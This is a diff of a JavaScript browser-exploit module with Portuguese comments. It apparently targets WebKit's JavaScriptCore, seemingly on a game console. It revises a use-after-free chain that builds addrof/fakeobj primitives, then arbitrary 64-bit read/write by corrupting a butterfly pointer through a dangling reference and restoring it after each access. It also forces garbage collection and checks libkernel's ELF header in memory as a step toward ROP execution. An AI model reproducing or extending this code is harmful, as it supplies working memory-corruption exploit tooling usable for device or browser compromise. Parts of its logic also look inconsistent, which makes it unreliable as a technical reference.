@@ -1,23 +1,22 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R55 - R/W Real Estabilizado)
+// js/script3/testArrayBufferVictimCrash.mjs (R56 - R/W Real com Gerenciamento de Estado)
 // =======================================================================================
-// ESTRATÉGIA R55:
-// Corrigido o erro "Cannot read properties of undefined (reading 'obj')".
-// A implementação de Leitura/Escrita Arbitrária foi reescrita para usar um
-// objeto "vítima" dedicado, preservando o estado do `dangling_ref` original
-// para garantir a estabilidade das primitivas `addrof` e `fakeobj`.
+// ESTRATÉGIA R56:
+// Corrigido o erro lógico onde read64(addr) retornava addr.
+// A nova implementação de read64/write64 gerencia o estado do UAF, salvando e
+// restaurando o ponteiro do butterfly a cada operação, garantindo estabilidade.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "ROP_Execution_RealRW_R55";
+export const FNAME_MODULE = "ROP_Execution_RealRW_R56";
 
-const ftoi = (val) => { /* ... (sem alterações) ... */ return new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]); };
-const itof = (val) => { /* ... (sem alterações) ... */ const buf = new ArrayBuffer(8); const ints = new Uint32Array(buf); ints[0] = val.low(); ints[1] = val.high(); return new Float64Array(buf)[0]; };
+const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
+const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };
 
 export async function runStableUAFPrimitives_R51() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: R/W Real Estabilizado ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: R/W com Gerenciamento de Estado ---`, "test");
     
     let final_result = { success: false, message: "Falha na cadeia de exploit." };
 
@@ -32,17 +31,15 @@ export async function runStableUAFPrimitives_R51() {
         };
         const fakeobj = (addr) => {
             dangling_ref.b = itof(addr);
-            // Assumindo que dangling_ref.a ainda aponta para 'holder'
             if (dangling_ref.a && typeof dangling_ref.a.obj !== 'undefined') {
                 return dangling_ref.a.obj;
             }
-            // Fallback ou erro se o estado for corrompido
             return undefined; 
         };
         logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");
 
-        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (REAL E ESTABILIZADO) ---", "subtest");
-        const { read64, write64 } = buildStableArbitraryReadWrite(addrof, fakeobj);
+        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (ESTÁVEL) ---", "subtest");
+        const { read64, write64 } = buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder);
         logS3("   Primitivas `read64` e `write64` REAIS e ESTÁVEIS construídas!", "good");
         
         logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
@@ -57,7 +54,7 @@ export async function runStableUAFPrimitives_R51() {
         }
         logS3("   SUCESSO: Magic number ELF da libkernel validado na memória REAL!", "vuln");
 
-        final_result = { success: true, message: "SUCESSO! Primitivas REAIS validadas." };
+        final_result = { success: true, message: "SUCESSO! Primitiva de leitura REAL validada." };
 
     } catch (e) {
         final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
@@ -73,57 +70,50 @@ export async function runStableUAFPrimitives_R51() {
 
 
 // =======================================================================================
-// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R55)
+// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R56)
 // =======================================================================================
-function buildStableArbitraryReadWrite(addrof, fakeobj) {
-    // Estratégia Estável:
-    // 1. Criamos um objeto "vítima" separado. A leitura/escrita ocorrerá através dele.
-    // 2. Criamos um objeto "falso" que se sobrepõe à vítima, permitindo-nos corromper suas propriedades.
-    // 3. Modificamos uma propriedade do objeto vítima para que ela se torne um ponteiro para
-    //    um endereço arbitrário.
+function buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder) {
+    // Estratégia de Gerenciamento de Estado:
+    // As primitivas addrof/fakeobj dependem de `dangling_ref.a` apontar para o objeto `holder`.
+    // Para ler/escrever, precisamos mudar `dangling_ref.a` temporariamente.
+    // A chave para a estabilidade é RESTAURAR `dangling_ref.a` para seu estado original
+    // (apontando para `holder`) após cada operação.
     
-    // 1. Nosso objeto vítima, que será corrompido.
-    const victim = {
-        prop_a: 1.1, // Um marcador
-        prop_b: null   // Esta propriedade será transformada em nosso ponteiro arbitrário.
-    };
+    // 1. Salvar o estado original (o ponteiro para o objeto `holder`).
+    //    Não podemos salvar o ponteiro diretamente, mas podemos salvá-lo *dentro* do próprio holder.
+    holder.original_a = dangling_ref.a;
 
-    // 2. Nosso objeto falso. Ele precisa ter a mesma "forma" (shape) que a vítima.
-    const fake_victim_struct = {
-        header: 0, // Placeholder para o cabeçalho do objeto
-        properties: null // Placeholder para o ponteiro de propriedades (butterfly)
-    };
-    
-    // 3. Obter o endereço do objeto vítima real.
-    const victim_addr = addrof(victim);
-
-    // 4. Criar o objeto falso que aponta para a vítima.
-    //    Isso nos dá um "handle" para a memória da vítima.
-    fake_victim_struct.properties = victim_addr;
-    const fake_victim = fakeobj(addrof(fake_victim_struct));
-
-    // A partir de agora, `fake_victim` e `victim` são duas visões do mesmo local de memória.
-    // `fake_victim.prop_b` nos permite modificar o que a propriedade `prop_b` da vítima aponta.
-    
     const read64 = (address) => {
-        // 1. Corrompemos a propriedade `prop_b` do `fake_victim`.
-        //    O `fakeobj(address)` cria uma referência para o endereço que queremos ler.
-        //    Atribuir isso a `fake_victim.prop_b` efetivamente muda o ponteiro da propriedade.
-        fake_victim.prop_b = fakeobj(address);
+        // 2. Corromper `dangling_ref.a` para apontar para o endereço que queremos LER.
+        //    O motor JS espera que o butterfly aponte para uma estrutura de butterfly,
+        //    não para dados brutos. Apontar para `address - 0x8` alinha o header do butterfly
+        //    de forma que o primeiro elemento de dados comece em `address`.
+        dangling_ref.a = { dummy: 0 }; // Atribuição para quebrar a referência antiga
+        dangling_ref.a = fakeobj(address.sub(8));
 
-        // 2. Agora, ao ler `victim.prop_b`, o motor JS segue o ponteiro corrompido
-        //    e lê o valor de 8 bytes do endereço de memória desejado.
-        return addrof(victim.prop_b);
+        // 3. Ler o valor. `dangling_ref.b` agora lê diretamente da memória no `address`.
+        const result = ftoi(dangling_ref.b);
+        
+        // 4. RESTAURAR O ESTADO! Isso é crucial.
+        //    Reatribuímos o ponteiro original salvo de volta para `dangling_ref.a`.
+        dangling_ref.a = holder.original_a;
+
+        return result;
     };
 
-    // A escrita é um pouco mais complexa, pois não podemos simplesmente atribuir um valor.
-    // A implementação de escrita geralmente requer uma segunda primitiva ou uma
-    // vulnerabilidade de "write-what-where". Para este teste, focaremos em validar a LEITURA.
     const write64 = (address, value) => {
-        // A implementação de escrita está fora do escopo desta correção, 
-        // pois a leitura é o primeiro passo para a validação.
-        logS3("   AVISO: A função write64 real não está implementada nesta versão.", "warn");
+        // Mesma lógica: corromper, operar, restaurar.
+        dangling_ref.a = { dummy: 0 };
+        dangling_ref.a = fakeobj(address.sub(8));
+        
+        dangling_ref.b = itof(value);
+        
+        dangling_ref.a = holder.original_a;
     };
+
+    // Para a primeira chamada `fakeobj` dentro de `read64` funcionar, o estado de
+    // `dangling_ref.a` precisa ser o `holder`. Vamos garantir isso com uma chamada inicial.
+    addrof({dummy_setup: 1});
 
     return { read64, write64 };
 }
@@ -131,9 +121,7 @@ function buildStableArbitraryReadWrite(addrof, fakeobj) {
 
 // --- Funções Auxiliares UAF (sem alterações) ---
 async function triggerGC() {
-    try {
-        const gc_trigger_arr = []; for (let i = 0; i < 500; i++) { gc_trigger_arr.push(new ArrayBuffer(1024 * 128)); }
-    } catch (e) { /* ignora */ }
+    try { const g = []; for (let i=0; i<500; i++) { g.push(new ArrayBuffer(1024*128)); } } catch (e) {}
     await PAUSE_S3(500);
 }
 
